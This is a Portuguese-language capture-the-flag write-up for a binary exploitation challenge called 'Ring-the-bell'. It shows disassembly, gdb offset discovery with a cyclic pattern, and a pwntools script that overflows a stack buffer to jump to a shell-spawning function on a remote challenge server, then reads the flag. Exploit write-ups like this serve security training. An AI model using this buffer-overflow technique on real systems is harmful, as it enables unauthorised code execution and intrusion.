# Ring-the-Bell
## Resolvida por Cesar B

```
┌──(t0x1n㉿t0x1n-Desktop)-[~/Desktop/CTF/CyberApocalpise/Ring-the-bell]
└─$ objdump -d -M intel ring_the_bell | sed -n '/<bell>:/,/^$/p'
000000000040176d <bell>:
  40176d:       f3 0f 1e fa             endbr64
  401771:       55                      push   rbp
  401772:       48 89 e5                mov    rbp,rsp
  401775:       ba 00 00 00 00          mov    edx,0x0
  40177a:       48 8d 05 de 08 00 00    lea    rax,[rip+0x8de]        # 40205f <_IO_stdin_used+0x5f>
  401781:       48 89 c6                mov    rsi,rax
  401784:       48 8d 05 d7 08 00 00    lea    rax,[rip+0x8d7]        # 402062 <_IO_stdin_used+0x62>
  40178b:       48 89 c7                mov    rdi,rax
  40178e:       b8 00 00 00 00          mov    eax,0x0
  401793:       e8 f8 f9 ff ff          call   401190 <execl@plt>
  401798:       90                      nop
  401799:       5d                      pop    rbp
  40179a:       c3                      ret

```

```
┌──(t0x1n㉿t0x1n-Desktop)-[~/Desktop/CTF/CyberApocalpise/Ring-the-bell]
└─$ chmod +x ring_the_bell
```

```
┌──(t0x1n㉿t0x1n-Desktop)-[~/Desktop/CTF/CyberApocalpise/Ring-the-bell]
└─$ objdump -d -M intel ring_the_bell |
sed -n '/<bell>:/,/^$/p'
000000000040176d <bell>:
  40176d:       f3 0f 1e fa             endbr64
  401771:       55                      push   rbp
  401772:       48 89 e5                mov    rbp,rsp
  401775:       ba 00 00 00 00          mov    edx,0x0
  40177a:       48 8d 05 de 08 00 00    lea    rax,[rip+0x8de]        # 40205f <_IO_stdin_used+0x5f>
  401781:       48 89 c6                mov    rsi,rax
  401784:       48 8d 05 d7 08 00 00    lea    rax,[rip+0x8d7]        # 402062 <_IO_stdin_used+0x62>
  40178b:       48 89 c7                mov    rdi,rax
  40178e:       b8 00 00 00 00          mov    eax,0x0
  401793:       e8 f8 f9 ff ff          call   401190 <execl@plt>
  401798:       90                      nop
  401799:       5d                      pop    rbp
  40179a:       c3                      ret
```

```py
┌──(t0x1n㉿t0x1n-Desktop)-[~/Desktop/CTF/CyberApocalpise/Ring-the-bell]
└─$ python3 - <<'PY' > pattern.txt
from pwn import *
import sys
sys.stdout.buffer.write(cyclic(300))
PY
```

```py
┌──(t0x1n㉿t0x1n-Desktop)-[~/Desktop/CTF/CyberApocalpise/Ring-the-bell]
└─$ gdb -q ./ring_the_bell
Reading symbols from ./ring_the_bell...
(No debugging symbols found in ./ring_the_bell)
(gdb) set disassembly-flavor intel
(gdb) run < pattern.txt
Starting program: /home/t0x1n/Desktop/CTF/CyberApocalpise/Ring-the-bell/ring_the_bell < pattern.txt
⚠️ warning: opening /proc/self/mem file failed: Permission denied (13)
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢤⡄⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠠⡈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠹⣆⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⢻⡆⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢸⣷⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠁⣿⣿⢯⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠸⣿⡄⠸⣿⣿⣿⡽⣿⣿⡈⣿⣿
⣿⡇⢸⣿⡏⢸⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣄⠘⢿⣿⡇⢹⣿⡇⢸⣿
⣿⡇⠈⣿⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣆⠈⣿⡇⠀⣿⠃⢸⣿
⣿⡇⠀⣿⡀⠸⣿⣦⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⢀⣈⣉⣥⣴⣿⠇⠀⣿⠀⢸⣿
⣿⣷⠀⢸⣧⠀⢻⣿⣿⣉⣙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣸⡇⠀⣼⣿
⣿⣿⣇⠈⢿⣧⡀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⣴⡿⠁⣸⣿⣿
⣿⣿⣿⣦⠈⢻⣿⣦⣙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣴⣿⡟⠁⣴⣿⣿⣿
⣿⣿⣿⣿⣷⣄⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢋⣠⣾⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣾⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣷⣿⣿⣿⣿⣿⣿⣿


[Garran Voss] Rin! Ring the bell to call for reinforcements!

[Rin]: 
[Garran Voss] D-d-did they hear us..?

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401829 in main ()
(gdb) x/gx $rsp
0x7fffffffdbc8: 0x6161616c6161616b
(gdb) quit
A debugging session is active.

        Inferior 1 [process 16446] will be killed.

Quit anyway? (y or n) y
```

```py
┌──(t0x1n㉿t0x1n-Desktop)-[~/Desktop/CTF/CyberApocalpise/Ring-the-bell]
└─$ python3 - <<'PY'
from pwn import *

valor = 0x6161616c6161616b
print(cyclic_find(p64(valor)))
PY

[!] cyclic_find() expected a 4-byte subsequence, you gave b'kaaalaaa'
    Unless you specified cyclic(..., n=8), you probably just want the first 4 bytes.
    Truncating the data at 4 bytes.  Specify cyclic_find(..., n=8) to override this.
40
```


``` bash
cat > exploit.py <<'PY'
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./ring_the_bell", checksec=False)
context.arch = "amd64"

HOST = "154.57.164.67"
PORT = 32577

OFFSET = 40

io = remote(HOST, PORT)

payload = flat(
    b"A" * OFFSET,
    elf.sym.bell
)

log.info(f"bell: {hex(elf.sym.bell)}")
log.info(f"payload: {len(payload)} bytes")

io.recvuntil(b"[Rin]:")
io.sendline(payload)

io.sendline(b"id")
io.sendline(b"cat flag.txt 2>/dev/null || cat /flag 2>/dev/null || find / -name 'flag*' -type f 2>/dev/null")
io.interactive()
PY
```                                         
                                         
                                                                                                                                                             
┌──(t0x1n㉿t0x1n-Desktop)-[~/Desktop/CTF/CyberApocalpise/Ring-the-bell]
└─$ python3 exploit.py                                                                                                           
[+] Opening connection to 154.57.164.67 on port 32577: Done
[*] bell: 0x40176d
[*] payload: 48 bytes
[*] Switching to interactive mode
 
[Garran Voss] D-d-did they hear us..?
uid=999(ctf) gid=999(ctf) groups=999(ctf)
HTB{R1ng4_R1ng4_R1111111nG_a57d4ccc220f2425f7d1e475e4fe4376}$  
